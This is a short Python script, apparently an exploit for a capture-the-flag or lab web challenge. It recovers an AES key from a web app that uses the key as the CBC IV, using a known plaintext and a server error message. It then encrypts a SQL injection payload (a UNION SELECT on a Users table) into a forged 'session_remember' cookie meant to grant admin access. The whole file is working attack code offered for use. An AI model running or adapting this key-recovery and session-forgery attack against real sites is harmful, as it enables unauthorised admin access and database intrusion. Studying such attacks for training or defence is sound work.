from Crypto.Cipher import AES
from  urllib import quote, unquote
import base64

#AES
def pad(s):
	return s + (16 - len(s) % 16) * chr(16 - len(s) % 16)
def encrypt(key, plain, IV):
	cipher = AES.new(key, AES.MODE_CBC, IV)
	return cipher.encrypt(plain)
def decrypt(key, ciphertext, IV):
	cipher = AES.new(key, AES.MODE_CBC, IV)
	return cipher.decrypt(ciphertext)
#

def xor_string(a, b):
	return ''.join([chr(ord(x) ^ ord(y)) for x, y in zip(a, b)])

#

salt = '|thisisareallyreallylongstringasfalsfassfasfaasff'
username = 'YYYYYY' + salt

session_remember = '8xmBjMeRrqqCMNIKPJIHm4KcuIDPOzKVkRnd7XLhhHjFwnenkQHuD2KMQoeHtad%2B7oNm7L9Z6hiMe9esacKJ7w%3D%3D'
session_remember = base64.b64decode(unquote(session_remember))

c1 = session_remember[:16]
p2 = username[16:32]

i2 = xor_string(c1, p2)

data = raw_input('Error from server: ')
data = base64.b64decode(unquote(data))

#key = '6d346761392d7232316b632c21402421'
key = xor_string(i2, data[:16])

usn = "' UNION SELECT username,1 FROM Users WHERE username='YYYYYY'#"
username = usn + salt

new_session_remember = encrypt(key, pad(username), key)
new_session_remember = quote(base64.b64encode(new_session_remember))

print('Admin session_remember: ' + new_session_remember)